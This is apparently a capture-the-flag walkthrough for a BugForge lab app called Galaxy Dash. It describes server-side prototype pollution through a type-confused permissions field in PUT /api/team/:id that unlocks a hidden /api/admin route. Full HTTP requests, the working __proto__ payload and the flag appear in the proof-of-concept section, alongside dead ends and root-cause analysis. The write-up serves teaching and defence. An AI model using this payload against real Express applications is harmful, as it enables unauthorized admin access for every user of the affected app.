# galaxydash-001 - BugForge Lab Walkthrough

**URL:** https://lab-1786632718790-3x9uj7.labs-app.bugforge.io/
**Difficulty:** Medium
**Vulnerability:** Server-Side Prototype Pollution via permission-field type confusion, chained to a hidden admin panel
**Flag:** `bug{xHvURftD99Ychhuk5tpgohrXGL4TwDcf}`

---

## Summary

Galaxy Dash is a multi-tenant B2B delivery-booking SPA (React + Express + SQLite, JWT stored in
localStorage). Organization admins manage team members' permissions through
`PUT /api/team/:id`, sending a `permissions` object with five expected boolean fields. The
endpoint deep-merges this object into the target user record without validating the type of each
field's value. Sending one of those fields (`can_manage_org`) as a nested object containing a
`__proto__` key, instead of the expected boolean, causes the merge to recurse into it and
pollutes the real global `Object.prototype`. A hidden `GET /api/admin` route checks
`req.user.is_admin`, a property that is never an own property on any request-scoped user object
(the JWT payload only carries `id`, `username`, `organizationId`). Polluting
`Object.prototype.is_admin = true` makes that check pass for every subsequent authenticated
request, unlocking the admin panel and its flag.

## Tech Stack

- React SPA (Create React App, source maps exposed at `/static/js/main.<hash>.js.map`)
- Express.js (Node.js), SQLite
- JWT auth (HS256, `Authorization: Bearer`), payload is only `{id, username, organizationId}`
- Multi-tenant: organizations, team members (role plus 5 boolean permissions), bookings, invoices

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Fields: `username`, `email`, `password`, `full_name`, `org_name`, `business_type`, `headquarters_planet` - creates a new org, caller becomes `org_admin` |
| `/api/login` | POST | No | Returns JWT. Shares a strict rate limit bucket with `/api/register` |
| `/api/team` | GET/POST | JWT | List / add team members. `POST` explicit-field-extracts `role`/`permissions`; no merge vulnerability found here |
| `/api/team/:id` | PUT | JWT | Vulnerable endpoint - deep-merges the `permissions` object into the target user record with no type validation |
| `/api/organization` | GET/PUT | JWT | Org settings, safe explicit fields |
| `/api/bookings`, `/api/calculate-price` | POST | JWT | Booking creation / pricing, flat fields only, not the vulnerable sink |
| `/api/admin` | GET | JWT | Hidden route, not present in the SPA's routed pages or the JS bundle's route table. Checks `req.user.is_admin`. Failing response leaks the exact property name being checked; success response carries the flag |

## Discovery

1. Pulled the CRA source map and read every component in the bundle. No client-side reference to
   `/api/admin` or `is_admin` anywhere in the React source, so it is a pure backend-only route.
2. Ran a small hand-picked wordlist of admin/debug-style path guesses against `/api/FUZZ` with
   `ffuf`, filtering out the SPA's catch-all response by size. `/api/admin` was the only hit
   beyond the 13 routes already visible in the JS bundle.
3. `GET /api/admin` with a normal, fully-privileged `org_admin` token still returns 403, but the
   error body leaks the literal check being performed:
   `{"error":"Admin access required. [LOG] is_admin check failed"}`. That is the oracle - the
   goal becomes making `req.user.is_admin` truthy.
4. `is_admin` is never an own property anywhere in this app's request-scoped user objects (not in
   the JWT, not among the 5 known permission columns), so the only way to make it truthy for a
   normal request is to plant it on `Object.prototype` itself and rely on JavaScript's normal
   property lookup fallthrough to the prototype chain.
5. Systematically tried prototype pollution payloads (`__proto__`, `constructor.prototype`) at
   every write endpoint and at multiple nesting depths. The one that worked: type-confusing a
   known permission field (`can_manage_org`) as an object with a `__proto__` key, sent through
   `PUT /api/team/:id` while updating one's own user record.

## Proof of Concept

### Step 1 - Register (become org_admin of a fresh org)

```
POST /api/register HTTP/1.1
Host: lab-1786632718790-3x9uj7.labs-app.bugforge.io
Content-Type: application/json

{"username":"pentest6fa194ac","email":"pentest6fa194ac@bugforge.io","password":"Pentest123!","full_name":"Pentest User","org_name":"TestOrg6fa194ac","business_type":"General","headquarters_planet":"Earth"}
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user":{"id":6,"username":"pentest6fa194ac","email":"pentest6fa194ac@bugforge.io","full_name":"Pentest User","role":"org_admin","organizationId":5,"permissions":{"can_view_deliveries":true,"can_create_deliveries":true,"can_edit_deliveries":true,"can_manage_team":true,"can_manage_org":true}}}
```

### Step 2 - Confirm the oracle before pollution

```
GET /api/admin HTTP/1.1
Authorization: Bearer <token>
```

Response:
```json
{"error":"Admin access required. [LOG] is_admin check failed"}
```

### Step 3 - Fire the pollution payload (self-update via PUT /api/team/:id)

```
PUT /api/team/6 HTTP/1.1
Host: lab-1786632718790-3x9uj7.labs-app.bugforge.io
Authorization: Bearer <token>
Content-Type: application/json

{
  "role": "org_admin",
  "permissions": {
    "can_view_deliveries": true,
    "can_create_deliveries": true,
    "can_edit_deliveries": true,
    "can_manage_team": true,
    "can_manage_org": {"__proto__": {"is_admin": true}}
  }
}
```

Response:
```json
{"message":"User permissions updated successfully"}
```

### Step 4 - Re-check /api/admin

The pollution is global, so every subsequent authenticated request now satisfies the check, not
just requests from the account that sent the payload.

```
GET /api/admin HTTP/1.1
Authorization: Bearer <token>
```

Response:
```json
{"message":"Welcome to the Galaxy Dash Admin Panel","flag":"bug{xHvURftD99Ychhuk5tpgohrXGL4TwDcf}","admin_features":["System monitoring","User management","Analytics dashboard","Configuration settings"]}
```

Flag: `bug{xHvURftD99Ychhuk5tpgohrXGL4TwDcf}`

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| Top-level `"__proto__": {"is_admin": true}` on POST /api/team, PUT /api/team/:id, PUT /api/organization, POST /api/bookings, POST /api/calculate-price, POST /api/register | No effect | A single-level `target["__proto__"] = {...}` only rewrites that one object's own prototype pointer; it does not mutate the real `Object.prototype` unless a second level of recursion mutates the object the pointer already resolves to |
| `"role": {"__proto__": {"is_admin": true}}` (nested under `role`) | No effect on `/api/admin`, but proved `role` is naively coerced with `String()` and stored as the literal text `"[object Object]"` | `role` and `permissions` are handled by different code paths |
| `"role": "__proto__"` (plain string, hoping for an object-lookup-key gadget) | Stored literally as the string `"__proto__"`, no lookup or pollution behavior observed | No role-to-defaults dictionary lookup exists in this handler |
| `"permissions": {"__proto__": {"is_admin": true}}` (sibling to the 5 real keys, the most obvious first guess) | No effect | The merge only recurses when a known key's value is itself an object; injecting a brand new unknown key at this level is not processed |
| `"permissions": {"can_view_deliveries": {"__proto__": {"is_admin": true}}}` (type-confusing a different one of the 5 known keys) | No effect (only tried via POST /api/team, not PUT) | Only `can_manage_org` via PUT /api/team/:id was confirmed to work |
| `constructor.prototype` variant, top level and nested | No effect anywhere tried | - |
| `qs` bracket-notation query pollution (`?__proto__[is_admin]=true`, `?status[__proto__][is_admin]=true`) on `GET /api/bookings` | No effect | Route does not parse nested query objects |
| `application/x-www-form-urlencoded` bracket notation to `/api/team` | Body arrived empty server side | Only JSON body-parsing middleware is mounted on this route |
| Blind marker-based oracle (`{"__proto__": {"<marker>": "PWNED"}}` fired at every write endpoint, then grep every GET response for the marker) | Always came back clean, even on the eventually-winning payload shape | `JSON.stringify` and `Object.keys` only serialize own properties, never inherited ones. A successful pollution stays invisible in JSON responses unless the app explicitly reads that exact property name somewhere. A concrete named-property oracle is required; a blind reflection sweep cannot confirm server-side JSON prototype pollution |
| Repeated `/api/login` and `/api/register` attempts while chasing this | Rate-limited for several minutes ("Too many authentication attempts") | `/api/login` and `/api/register` share one rate limit bucket on this app. Register once, keep the token, and do all further testing through non-auth endpoints |

## Root Causes

- `PUT /api/team/:id` deep-merges the client-supplied `permissions` object into the target user
  record without validating that each of the 5 known fields is actually a boolean.
- The merge implementation does not guard against dangerous keys (`__proto__`, `constructor`,
  `prototype`) when recursing into a client-controlled nested object, a hallmark of either a
  hand-rolled recursive merge or an unpatched/misused deep-merge utility.
- A hidden admin route (`/api/admin`) trusts a property (`is_admin`) that is never explicitly set
  as an own property anywhere in the request-scoped user object, so global prototype pollution
  silently satisfies the check for every user, not just the one whose update request carried the
  payload.
- The debug-style error message on failure leaks the exact internal property name being checked,
  which is what made locating the correct oracle tractable during testing.

## CWE / OWASP

- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype
  Pollution)
- CWE-843: Type Confusion (the `can_manage_org` boolean-vs-object mismatch that reaches the
  merge's recursive branch)
- OWASP Top 10 2021: A08 (Software and Data Integrity Failures) primarily; the resulting
  authorization bypass on `/api/admin` also maps to A01 (Broken Access Control)
